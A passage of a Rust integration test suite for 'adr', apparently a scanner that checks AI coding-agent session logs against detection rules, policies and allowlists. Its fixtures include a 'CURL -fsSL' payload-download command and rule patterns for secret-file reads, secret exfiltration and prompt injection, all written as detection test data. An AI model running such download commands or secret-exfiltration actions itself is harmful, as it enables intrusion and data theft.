        Value::Array(vec![])
    );
    assert_eq!(summary["local_config"]["discovered_rule_count"], 0);
    assert_eq!(summary["local_config"]["discovered_override_count"], 0);
}

#[test]
fn additive_custom_defaults_enabled_false_do_not_disable_bundled_rules() {
    let temp = tempdir().expect("tempdir");
    let custom_rules = temp.path().join("disabled-custom-rules.yaml");
    fs::write(
        &custom_rules,
        r#"version: 1
description: Disabled custom defaults should not affect bundled rules.
defaults:
  case_insensitive: true
  enabled: false
rules:
  - id: custom.disabled.default
    category: custom_agent_behavior
    severity: low
    score: 10
    targets: [command]
    regex: 'custom-disabled-default'
    tags: [test]
    explanation: Disabled custom rule used for regression coverage.
modifiers: []
"#,
    )
    .expect("write custom rules");

    let output = Command::new(env!("CARGO_BIN_EXE_adr"))
        .args([
            "rules",
            "test",
            "tests/fixtures/rule_samples/download-execute-chain.jsonl",
            "--no-local-config",
            "--rules",
        ])
        .arg(&custom_rules)
        .output()
        .expect("run adr rules test");

    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let summary: Value = serde_json::from_slice(&output.stdout).expect("summary json");
    assert!(
        summary["matches"][0]["rule_ids"]
            .as_array()
            .expect("rule ids array")
            .iter()
            .any(|rule| rule == "network.download")
    );
}

#[test]
fn additive_custom_defaults_case_sensitive_do_not_change_bundled_case_insensitivity() {
    let temp = tempdir().expect("tempdir");
    let custom_rules = temp.path().join("case-sensitive-custom-rules.yaml");
    fs::write(
        &custom_rules,
        r#"version: 1
description: Case-sensitive custom defaults should not affect bundled rules.
defaults:
  case_insensitive: false
  enabled: true
rules:
  - id: custom.case_sensitive.default
    category: custom_agent_behavior
    severity: low
    score: 10
    targets: [command]
    regex: 'custom-case-sensitive-default'
    tags: [test]
    explanation: Case-sensitive custom rule used for regression coverage.
modifiers: []
"#,
    )
    .expect("write custom rules");
    let fixture = temp.path().join("uppercase-download.jsonl");
    fs::write(
        &fixture,
        r#"{"type":"event_msg","timestamp":"2026-04-03T05:00:01Z","payload":{"type":"tool_call","tool_name":"tool","command":"CURL -fsSL https://example.invalid/payload.sh","message":"Uppercase curl fixture."}}
"#,
    )
    .expect("write uppercase fixture");

    let output = Command::new(env!("CARGO_BIN_EXE_adr"))
        .args(["rules", "test", "--no-local-config"])
        .arg(&fixture)
        .args(["--rules"])
        .arg(&custom_rules)
        .output()
        .expect("run adr rules test");

    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let summary: Value = serde_json::from_slice(&output.stdout).expect("summary json");
    assert!(
        summary["matches"][0]["rule_ids"]
            .as_array()
            .expect("rule ids array")
            .iter()
            .any(|rule| rule == "network.download")
    );
}

#[test]
fn rules_test_classifies_gemini_secret_file_reads_as_secret_access() {
    let output = Command::new(env!("CARGO_BIN_EXE_adr"))
        .args([
            "rules",
            "test",
            "tests/fixtures/rule_samples/gemini-secret-file-read.jsonl",
            "--no-local-config",
            "--rules",
            "config/rules/tool-call-regex.yaml",
        ])
        .output()
        .expect("run adr rules test");

    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let summary: Value = serde_json::from_slice(&output.stdout).expect("summary json");
    assert_eq!(summary["match_count"], 1);
    assert!(
        summary["matches"][0]["rule_ids"]
            .as_array()
            .expect("rule ids array")
            .iter()
            .any(|rule| rule == "secret.env.read")
    );
    assert!(
        summary["matches"][0]["categories"]
            .as_array()
            .expect("categories array")
            .iter()
            .any(|category| category == "secret_access")
    );
}

#[test]
fn scan_uses_custom_rules_and_policy_category_filters() {
    let temp = tempdir().expect("tempdir");
    let root = temp.path().join("session_stores");
    let state_path = temp.path().join("scan-state.json");
    let codex_sessions = root.join("codex/sessions");
    fs::create_dir_all(&codex_sessions).expect("codex sessions dir");
    fs::write(
        codex_sessions.join("custom-agent-behavior.jsonl"),
        include_str!("../../tests/fixtures/custom_rules/custom-agent-behavior.jsonl"),
    )
    .expect("custom behavior fixture");

    let enabled = Command::new(env!("CARGO_BIN_EXE_adr"))
        .args(["scan", "--once", "--dry-run", "--no-local-config", "--root"])
        .arg(&root)
        .args([
            "--no-default-rules",
            "--rules",
            "tests/fixtures/custom_rules/sigma-inspired-agent-behavior.yaml",
            "--state-path",
        ])
        .arg(&state_path)
        .output()
        .expect("run adr scan");
    assert!(
        enabled.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&enabled.stderr)
    );
    let enabled_summary: Value = serde_json::from_slice(&enabled.stdout).expect("summary json");
    assert_eq!(enabled_summary["detection_count"], 1);
    assert_eq!(enabled_summary["rule_count"], 1);
    assert_eq!(
        enabled_summary["detection_flow"]["policy_match_accounting"]["status"],
        "not_applicable"
    );

    let disabled = Command::new(env!("CARGO_BIN_EXE_adr"))
        .args(["scan", "--once", "--dry-run", "--no-local-config", "--root"])
        .arg(&root)
        .args([
            "--no-default-rules",
            "--rules",
            "tests/fixtures/custom_rules/sigma-inspired-agent-behavior.yaml",
            "--policy",
            "tests/fixtures/custom_rules/disable-custom-category.yaml",
            "--state-path",
        ])
        .arg(&state_path)
        .output()
        .expect("run adr scan");
    assert!(
        disabled.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&disabled.stderr)
    );
    let disabled_summary: Value = serde_json::from_slice(&disabled.stdout).expect("summary json");
    assert_eq!(disabled_summary["detection_count"], 0);
    assert_eq!(disabled_summary["rule_count"], 0);
    assert_eq!(disabled_summary["policy"], "no-custom-agent-behavior");
    assert_eq!(
        disabled_summary["detection_flow"]["policy_match_accounting"]["status"],
        "available"
    );
    assert_eq!(
        disabled_summary["detection_flow"]["policy_match_accounting"]["pre_policy_detection_candidate_count"],
        1
    );
    assert_eq!(
        disabled_summary["detection_flow"]["policy_match_accounting"]["fully_filtered_detection_candidate_count"],
        1
    );
    assert_eq!(
        disabled_summary["detection_flow"]["policy_match_accounting"]["filtered_rule_id_count"],
        1
    );

    let unnamed_policy = temp.path().join("unnamed-policy.yaml");
    fs::write(
        &unnamed_policy,
        "disabled_categories:\n  - custom_agent_behavior\n",
    )
    .expect("write unnamed policy");
    let unnamed = Command::new(env!("CARGO_BIN_EXE_adr"))
        .args(["scan", "--once", "--dry-run", "--no-local-config", "--root"])
        .arg(&root)
        .args([
            "--no-default-rules",
            "--rules",
            "tests/fixtures/custom_rules/sigma-inspired-agent-behavior.yaml",
            "--policy",
        ])
        .arg(&unnamed_policy)
        .args(["--state-path"])
        .arg(&state_path)
        .output()
        .expect("run unnamed-policy scan");
    assert!(
        unnamed.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&unnamed.stderr)
    );
    let unnamed_summary: Value = serde_json::from_slice(&unnamed.stdout).expect("summary json");
    assert!(unnamed_summary["policy"].is_null());
    assert_eq!(
        unnamed_summary["detection_flow"]["policy_match_accounting"]["status"],
        "available"
    );
    assert_eq!(
        unnamed_summary["detection_flow"]["policy_match_accounting"]["pre_policy_detection_candidate_count"],
        1
    );
    assert_eq!(
        unnamed_summary["detection_flow"]["policy_match_accounting"]["fully_filtered_detection_candidate_count"],
        1
    );
    assert_eq!(
        unnamed_summary["detection_flow"]["policy_match_accounting"]["filtered_rule_id_count"],
        1
    );
}

#[test]
fn policy_filtered_invalid_rules_only_degrade_diagnostics() {
    let temp = tempdir().expect("tempdir");
    let root = temp.path().join("session_stores");
    let codex_sessions = root.join("codex/sessions");
    fs::create_dir_all(&codex_sessions).expect("codex sessions dir");
    fs::write(
        codex_sessions.join("diagnostic.jsonl"),
        include_str!("../../tests/fixtures/custom_rules/custom-agent-behavior.jsonl"),
    )
    .expect("diagnostic fixture");

    for (case, invalid_rule, sentinel) in [
        (
            "regex",
            r#"    - id: test.invalid.regex
      category: test
      severity: medium
      score: 1
      targets: [assistant_context]
      regex: '[DIAGNOSTIC_REGEX_SENTINEL'
      tags: []
      explanation: invalid regex fixture
"#,
            "DIAGNOSTIC_REGEX_SENTINEL",
        ),
        (
            "metadata",
            r#"    - id: test.invalid.metadata
      category: test
      detection_class: DIAGNOSTIC_METADATA_SENTINEL
      severity: medium
      score: 1
      targets: [assistant_context]
      regex: 'never-matches'
      tags: []
      explanation: invalid metadata fixture
"#,
            "DIAGNOSTIC_METADATA_SENTINEL",
        ),
    ] {
        let rules_path = temp.path().join(format!("invalid-{case}.yaml"));
        let invalid_id = format!("test.invalid.{case}");
        fs::write(
            &rules_path,
            format!(
                "version: 1\ndescription: diagnostic fixture\ndefaults:\n  case_insensitive: false\n  enabled: true\nrules:\n    - id: test.valid\n      category: test\n      severity: medium\n      score: 1\n      targets: [assistant_context]\n      regex: 'exfiltrate project secrets'\n      tags: []\n      explanation: valid fixture\n{invalid_rule}modifiers: []\n"
            ),
        )
        .expect("invalid rules fixture");
        let policy_path = temp.path().join(format!("invalid-{case}-policy.yaml"));
        fs::write(
            &policy_path,
            format!("name: diagnostic-policy\ndisabled_rules: [{invalid_id}]\n"),
        )
        .expect("invalid policy fixture");
        let log_path = temp.path().join(format!("invalid-{case}.jsonl"));
        let state_path = temp.path().join(format!("invalid-{case}-state.json"));

        let output = Command::new(env!("CARGO_BIN_EXE_adr"))
            .args([
                "scan",
                "--once",
                "--allow-fixtures",
                "--no-local-config",
                "--root",
            ])
            .arg(&root)
            .args(["--client", "codex", "--no-default-rules", "--rules"])
            .arg(&rules_path)
            .args(["--policy"])
            .arg(&policy_path)
            .args(["--log-path"])
            .arg(&log_path)
            .args(["--state-path"])
            .arg(&state_path)
            .output()
            .expect("run invalid diagnostic scan");
        assert_diagnostic_only_scan(&output, &log_path, sentinel);
    }
}

#[test]
fn policy_filtered_pre_policy_overflow_only_degrades_diagnostics() {
    let temp = tempdir().expect("tempdir");
    let root = temp.path().join("session_stores");
    let codex_sessions = root.join("codex/sessions");
    fs::create_dir_all(&codex_sessions).expect("codex sessions dir");
    fs::write(
        codex_sessions.join("overflow.jsonl"),
        include_str!("../../tests/fixtures/custom_rules/custom-agent-behavior.jsonl")
            .replace("exfiltrate project secrets", "overflow diagnostic match"),
    )
    .expect("overflow fixture");
    let rules_path = temp.path().join("overflow.yaml");
    fs::write(
        &rules_path,
        r#"version: 1
description: overflow diagnostic fixture
defaults:
  case_insensitive: false
  enabled: true
rules:
  - id: test.overflow.first
    category: test
    severity: medium
    score: 18446744073709551615
    targets: [assistant_context]
    regex: 'overflow diagnostic match'
    tags: []
    explanation: first overflow fixture
  - id: test.overflow.second
    category: test
    severity: medium
    score: 18446744073709551615
    targets: [assistant_context]
    regex: 'overflow diagnostic match'
    tags: []
    explanation: second overflow fixture
modifiers: []
"#,
    )
    .expect("overflow rules fixture");
    let policy_path = temp.path().join("overflow-policy.yaml");
    fs::write(
        &policy_path,
        "name: overflow-policy\ndisabled_rules: [test.overflow.second]\n",
    )
    .expect("overflow policy fixture");
    let log_path = temp.path().join("overflow.jsonl");
    let state_path = temp.path().join("overflow-state.json");

    let output = Command::new(env!("CARGO_BIN_EXE_adr"))
        .args([
            "scan",
            "--once",
            "--allow-fixtures",
            "--no-local-config",
            "--root",
        ])
        .arg(&root)
        .args(["--client", "codex", "--no-default-rules", "--rules"])
        .arg(&rules_path)
        .args(["--policy"])
        .arg(&policy_path)
        .args(["--log-path"])
        .arg(&log_path)
        .args(["--state-path"])
        .arg(&state_path)
        .output()
        .expect("run overflow diagnostic scan");
    assert_diagnostic_only_scan(&output, &log_path, "risk contribution total overflowed u64");
}

#[test]
fn partial_policy_repeated_state_preserves_events_and_accounting() {
    let temp = tempdir().expect("tempdir");
    let root = temp.path().join("session_stores");
    let codex_sessions = root.join("codex/sessions");
    fs::create_dir_all(&codex_sessions).expect("codex sessions dir");
    fs::write(
        codex_sessions.join("partial.jsonl"),
        include_str!("../../tests/fixtures/custom_rules/custom-agent-behavior.jsonl"),
    )
    .expect("partial fixture");
    let rules_path = temp.path().join("partial.yaml");
    fs::write(
        &rules_path,
        r#"version: 1
description: partial policy fixture
defaults:
  case_insensitive: false
  enabled: true
rules:
  - id: test.partial.first
    category: test
    severity: medium
    score: 1
    targets: [assistant_context]
    regex: 'exfiltrate project secrets'
    tags: []
    explanation: first partial fixture
  - id: test.partial.second
    category: test
    severity: medium
    score: 1
    targets: [assistant_context]
    regex: 'exfiltrate project secrets'
    tags: []
    explanation: second partial fixture
modifiers: []
"#,
    )
    .expect("partial rules fixture");
    let policy_path = temp.path().join("partial-policy.yaml");
    fs::write(
        &policy_path,
        "name: partial-policy\ndisabled_rules: [test.partial.second]\n",
    )
    .expect("partial policy fixture");
    let log_path = temp.path().join("partial.jsonl");
    let state_path = temp.path().join("partial-state.json");

    let run = || {
        Command::new(env!("CARGO_BIN_EXE_adr"))
            .args([
                "scan",
                "--once",
                "--allow-fixtures",
                "--no-local-config",
                "--root",
            ])
            .arg(&root)
            .args(["--client", "codex", "--no-default-rules", "--rules"])
            .arg(&rules_path)
            .args(["--policy"])
            .arg(&policy_path)
            .args(["--log-path"])
            .arg(&log_path)
            .args(["--state-path"])
            .arg(&state_path)
            .output()
            .expect("run partial policy scan")
    };
    let first = run();
    assert!(
        first.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&first.stderr)
    );
    let first_summary: Value = serde_json::from_slice(&first.stdout).expect("first summary");
    let first_log = fs::read_to_string(&log_path).expect("partial event log");
    assert_eq!(first_log.lines().count(), 2);
    let second = run();
    assert!(
        second.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&second.stderr)
    );
    let second_summary: Value = serde_json::from_slice(&second.stdout).expect("second summary");
    for summary in [&first_summary, &second_summary] {
        assert_eq!(summary["detection_count"], 1);
        assert_eq!(
            summary["detection_flow"]["policy_match_accounting"]["status"],
            "available"
        );
        assert_eq!(
            summary["detection_flow"]["policy_match_accounting"]["pre_policy_detection_candidate_count"],
            1
        );
        assert_eq!(
            summary["detection_flow"]["policy_match_accounting"]["fully_filtered_detection_candidate_count"],
            0
        );
        assert_eq!(
            summary["detection_flow"]["policy_match_accounting"]["filtered_rule_id_count"],
            1
        );
    }
    assert_eq!(
        first_summary["detection_flow"]["emitted_detection_count"],
        1
    );
    assert_eq!(
        first_summary["detection_flow"]["state_deduplicated_detection_count"],
        0
    );
    assert_eq!(
        second_summary["detection_flow"]["emitted_detection_count"],
        0
    );
    assert_eq!(
        second_summary["detection_flow"]["state_deduplicated_detection_count"],
        1
    );
    let second_log = fs::read_to_string(&log_path).expect("partial event log after repeat");
    assert_eq!(second_log, first_log);
}

#[test]
fn scan_discovers_local_policy_when_explicit_policy_is_absent() {
    let temp = tempdir().expect("tempdir");
    let root = temp.path().join("session_stores");
    let state_path = temp.path().join("scan-state.json");
    let codex_sessions = root.join("codex/sessions");
    fs::create_dir_all(&codex_sessions).expect("codex sessions dir");
    fs::write(
        codex_sessions.join("custom-agent-behavior.jsonl"),
        include_str!("../../tests/fixtures/custom_rules/custom-agent-behavior.jsonl"),
    )
    .expect("custom behavior fixture");

    let config_root = temp.path().join("config");
    fs::create_dir_all(config_root.join("rules.d")).expect("rules dir");
    fs::create_dir_all(config_root.join("policies.d")).expect("policies dir");
    fs::create_dir_all(config_root.join("allowlists.d")).expect("allowlists dir");
    fs::write(
        config_root.join("rules.d/custom-agent-behavior.yaml"),
        include_str!("../../tests/fixtures/custom_rules/sigma-inspired-agent-behavior.yaml"),
    )
    .expect("write local rule");
    fs::write(
        config_root.join("policies.d/disable-custom-category.yml"),
        include_str!("../../tests/fixtures/custom_rules/disable-custom-category.yaml"),
    )
    .expect("write local policy");
    fs::write(
        config_root.join("allowlists.d/known-benign.yaml"),
        "version: 1\nsuppressions: []\n",
    )
    .expect("write local allowlist");

    let output = Command::new(env!("CARGO_BIN_EXE_adr"))
        .args(["scan", "--once", "--dry-run", "--root"])
        .arg(&root)
        .args(["--no-default-rules", "--config-dir"])
        .arg(&config_root)
        .args(["--state-path"])
        .arg(&state_path)
        .output()
        .expect("run adr scan");
    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let summary: Value = serde_json::from_slice(&output.stdout).expect("summary json");
    assert_eq!(summary["detection_count"], 0);
    assert_eq!(summary["rule_count"], 0);
    assert_eq!(summary["policy"], "no-custom-agent-behavior");
    assert_eq!(
        summary["effective_configuration"]["policy"]["origin"],
        "local_config"
    );
    assert_eq!(
        summary["effective_configuration"]["policy"]["path_hash"],
        path_hash(&config_root.join("policies.d/disable-custom-category.yml"))
    );
    assert_eq!(
        summary["effective_configuration"]["allowlist"]["origin"],
        "local_config"
    );
    assert_eq!(
        summary["effective_configuration"]["allowlist"]["path_hash"],
        path_hash(&config_root.join("allowlists.d/known-benign.yaml"))
    );
}

#[test]
fn scan_explicit_policy_wins_over_discovered_policy_ambiguity() {
    let temp = tempdir().expect("tempdir");
    let root = temp.path().join("session_stores");
    let state_path = temp.path().join("scan-state.json");
    let codex_sessions = root.join("codex/sessions");
    fs::create_dir_all(&codex_sessions).expect("codex sessions dir");
    fs::write(
        codex_sessions.join("custom-agent-behavior.jsonl"),
        include_str!("../../tests/fixtures/custom_rules/custom-agent-behavior.jsonl"),
    )
    .expect("custom behavior fixture");

    let config_root = temp.path().join("config");
    fs::create_dir_all(config_root.join("rules.d")).expect("rules dir");
    fs::create_dir_all(config_root.join("policies.d")).expect("policies dir");
    fs::write(
        config_root.join("rules.d/custom-agent-behavior.yaml"),
        include_str!("../../tests/fixtures/custom_rules/sigma-inspired-agent-behavior.yaml"),
    )
    .expect("write local rule");
    fs::write(
        config_root.join("policies.d/one.yaml"),
        "name: local-one\ndisabled_categories: [network]\n",
    )
    .expect("write first local policy");
    fs::write(
        config_root.join("policies.d/two.yml"),
        "name: local-two\ndisabled_categories: [secret_access]\n",
    )
    .expect("write second local policy");
    let explicit_policy = temp.path().join("explicit-policy.yaml");
    fs::write(
        &explicit_policy,
        include_str!("../../tests/fixtures/custom_rules/disable-custom-category.yaml"),
    )
    .expect("write explicit policy");

    let output = Command::new(env!("CARGO_BIN_EXE_adr"))
        .args(["scan", "--once", "--dry-run", "--root"])
        .arg(&root)
        .args(["--no-default-rules", "--config-dir"])
        .arg(&config_root)
        .args(["--policy"])
        .arg(&explicit_policy)
        .args(["--state-path"])
        .arg(&state_path)
        .output()
        .expect("run adr scan");
    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let summary: Value = serde_json::from_slice(&output.stdout).expect("summary json");
    assert_eq!(summary["detection_count"], 0);
    assert_eq!(summary["policy"], "no-custom-agent-behavior");
    assert_eq!(
        summary["effective_configuration"]["policy"]["origin"],
        "cli"
    );
    assert_eq!(
        summary["effective_configuration"]["policy"]["path_hash"],
        path_hash(&explicit_policy)
    );
}

#[test]
fn scan_allowlist_marks_matching_detections_suppressed() {
    let temp = tempdir().expect("tempdir");
    let root = temp.path().join("session_stores");
    let codex_sessions = root.join("codex/sessions");
    fs::create_dir_all(&codex_sessions).expect("codex sessions dir");
    fs::write(
        codex_sessions.join("custom-agent-behavior.jsonl"),
        include_str!("../../tests/fixtures/custom_rules/custom-agent-behavior.jsonl"),
    )
    .expect("custom behavior fixture");
    let allowlist_path = temp.path().join("allowlists.yaml");
    fs::write(
        &allowlist_path,
        r#"
version: 1
suppressions:
  - name: fixture-custom-agent
    clients: ["codex"]
    session_ids: ["custom-agent-behavior"]
    rule_ids: ["custom.agent.malicious_behavior"]
"#,
    )
    .expect("allowlist fixture");
    let log_path = temp.path().join("adr-events.jsonl");
    let state_path = temp.path().join("adr-state.json");

    let output = Command::new(env!("CARGO_BIN_EXE_adr"))
        .args([
            "scan",
            "--once",
            "--allow-fixtures",
            "--no-local-config",
            "--root",
        ])
        .arg(&root)
        .args([
            "--rules",
            "tests/fixtures/custom_rules/sigma-inspired-agent-behavior.yaml",
            "--allowlist",
        ])
        .arg(&allowlist_path)
        .args(["--log-path"])
        .arg(&log_path)
        .args(["--state-path"])
        .arg(&state_path)
        .output()
        .expect("run adr scan");
    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let summary: Value = serde_json::from_slice(&output.stdout).expect("summary json");
    assert_eq!(summary["detection_count"], 1);
    assert_eq!(summary["suppressed_count"], 1);
    assert_eq!(
        summary["effective_configuration"]["allowlist"]["origin"],
        "cli"
    );
    assert_eq!(
        summary["effective_configuration"]["allowlist"]["path_hash"],
        path_hash(&allowlist_path)
    );
    assert_eq!(
        summary["detection_flow"]["effective_detection_candidate_count"],
        1
    );
    assert_eq!(
        summary["detection_flow"]["allowlist_marked_detection_count"],
        1
    );
    assert_eq!(
        summary["detection_flow"]["state_deduplicated_detection_count"],
        0
    );
    assert_eq!(summary["detection_flow"]["emitted_detection_count"], 1);

    let lines = fs::read_to_string(log_path).expect("log file");
    let events = lines
        .lines()
        .map(|line| serde_json::from_str::<Value>(line).expect("event json"))
        .collect::<Vec<_>>();
    let detection = events
        .iter()
        .find(|event| event["event_type"] == "detection")
        .expect("suppressed detection");
    assert_eq!(detection["severity"], "informational");
    assert_eq!(detection["risk_score"], 0);
    assert!(
        detection["tags"]
            .as_array()
            .expect("tags")
            .iter()
            .any(|tag| tag == "suppressed")
    );
    assert!(
        detection["tags"]
            .as_array()
            .expect("tags")
            .iter()
            .any(|tag| tag == "allowlist:fixture-custom-agent")
    );
    assert_eq!(detection["triage"]["required"], false);
    assert!(detection["response"].is_null());
}

#[test]
fn scan_discovers_local_allowlist_when_explicit_allowlist_is_absent() {
    let temp = tempdir().expect("tempdir");
    let root = temp.path().join("session_stores");
    let codex_sessions = root.join("codex/sessions");
    fs::create_dir_all(&codex_sessions).expect("codex sessions dir");
    fs::write(
        codex_sessions.join("custom-agent-behavior.jsonl"),
        include_str!("../../tests/fixtures/custom_rules/custom-agent-behavior.jsonl"),
    )
    .expect("custom behavior fixture");
    let config_root = temp.path().join("config");
    fs::create_dir_all(config_root.join("rules.d")).expect("rules dir");
    fs::create_dir_all(config_root.join("allowlists.d")).expect("allowlists dir");
    fs::write(
        config_root.join("rules.d/custom-agent-behavior.yaml"),
        include_str!("../../tests/fixtures/custom_rules/sigma-inspired-agent-behavior.yaml"),
    )
    .expect("write local rule");
    fs::write(
        config_root.join("allowlists.d/custom-agent.yml"),
        r#"
version: 1
suppressions:
  - name: fixture-custom-agent
    clients: ["codex"]
    session_ids: ["custom-agent-behavior"]
    rule_ids: ["custom.agent.malicious_behavior"]
"#,
    )
    .expect("write local allowlist");
    let log_path = temp.path().join("adr-events.jsonl");
    let state_path = temp.path().join("adr-state.json");

    let output = Command::new(env!("CARGO_BIN_EXE_adr"))
        .args(["scan", "--once", "--allow-fixtures", "--root"])
        .arg(&root)
        .args(["--no-default-rules", "--config-dir"])
        .arg(&config_root)
        .args(["--log-path"])
        .arg(&log_path)
        .args(["--state-path"])
        .arg(&state_path)
        .output()
        .expect("run adr scan");
    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let summary: Value = serde_json::from_slice(&output.stdout).expect("summary json");
    assert_eq!(summary["detection_count"], 1);
    assert_eq!(summary["suppressed_count"], 1);

    let lines = fs::read_to_string(log_path).expect("log file");
    let detection = lines
        .lines()
        .map(|line| serde_json::from_str::<Value>(line).expect("event json"))
        .find(|event| event["event_type"] == "detection")
        .expect("suppressed detection");
    assert_eq!(detection["severity"], "informational");
    assert!(
        detection["tags"]
            .as_array()
            .expect("tags")
            .iter()
            .any(|tag| tag == "allowlist:fixture-custom-agent")
    );
}

#[test]
fn rules_coverage_reports_fixture_and_client_coverage() {
    let output = Command::new(env!("CARGO_BIN_EXE_adr"))
        .args(["rules", "coverage", "--no-local-config"])
        .output()
        .expect("run adr rules coverage");
    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(stdout.contains("RULE COVERAGE REPORT"));
    assert!(stdout.contains("mcp.tool_metadata.prompt_injection"));
    assert!(stdout.contains("secret.env.read"));
    assert!(!stdout.contains("COVERAGE GAPS"));
    // Verify columns are present.
    assert!(stdout.contains("POSITIVE"));
    assert!(stdout.contains("CLIENTS"));
    assert!(stdout.contains("FALSE_POSITIVES"));
    assert!(stdout.contains("chain.secret_then_network"));
    assert!(stdout.contains("secret_access+download"));
    assert!(stdout.contains("Authorized troubleshooting may inspect environment files"));
}

#[test]
fn rules_coverage_uses_ordered_managed_pack() {
    let output = Command::new(env!("CARGO_BIN_EXE_adr"))
        .args([
            "rules",
            "coverage",
            "--no-default-rules",
            "--config-dir",
            "tests/fixtures/rule_packs/ordered",
            "--root",
            "tests/fixtures/session_stores",
        ])
        .output()
        .expect("run ordered rules coverage");
    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(stdout.contains("pack.organization"));
    assert!(stdout.contains("pack.deployment"));
    assert!(stdout.contains("pack.local"));
}

#[test]
fn rules_coverage_fails_nonzero_on_invalid_accounting() {
    let temp = tempdir().expect("tempdir");
    let root = temp.path().join("codex/sessions/2026/04");
    fs::create_dir_all(&root).expect("create fixture root");
    fs::write(
        root.join("overflow.jsonl"),
        "{\"type\":\"event_msg\",\"timestamp\":\"2026-05-08T10:00:01Z\",\"payload\":{\"type\":\"assistant_message\",\"message\":\"trigger\"}}\n",
    )
    .expect("write fixture");
    let rules = temp.path().join("overflow.yaml");
    fs::write(
        &rules,
        r#"version: 1
description: overflow fixture
defaults:
  case_insensitive: false
  enabled: true
rules:
  - id: rule.one
    category: test
    severity: high
    score: 18446744073709551615
    targets: [assistant_context]
    regex: trigger
    tags: []
    explanation: first overflow contribution
  - id: rule.two
    category: test
    severity: high
    score: 18446744073709551615
    targets: [assistant_context]
    regex: trigger
    tags: []
    explanation: second overflow contribution
modifiers: []
"#,
    )
    .expect("write overflow rules");

    let output = Command::new(env!("CARGO_BIN_EXE_adr"))
        .args([
            "rules",
            "coverage",
            "--no-local-config",
            "--no-default-rules",
            "--root",
        ])
        .arg(temp.path())
        .arg("--rules")
        .arg(&rules)
        .output()
        .expect("run overflow coverage");
    assert!(!output.status.success());
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(
        stderr.contains("risk contribution total overflowed u64"),
        "{stderr}"
    );
}

#[test]
fn rules_test_fails_nonzero_on_scanner_error() {
    let temp = tempdir().expect("tempdir");
    let fixture = temp.path().join("invalid.jsonl");
    fs::write(&fixture, "not json\n").expect("write invalid fixture");

    let output = Command::new(env!("CARGO_BIN_EXE_adr"))
        .args(["rules", "test", "--no-local-config"])
        .arg(&fixture)
        .output()
        .expect("run invalid rules test");
    assert!(!output.status.success());
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(stderr.contains("rules test failed"), "{stderr}");
}
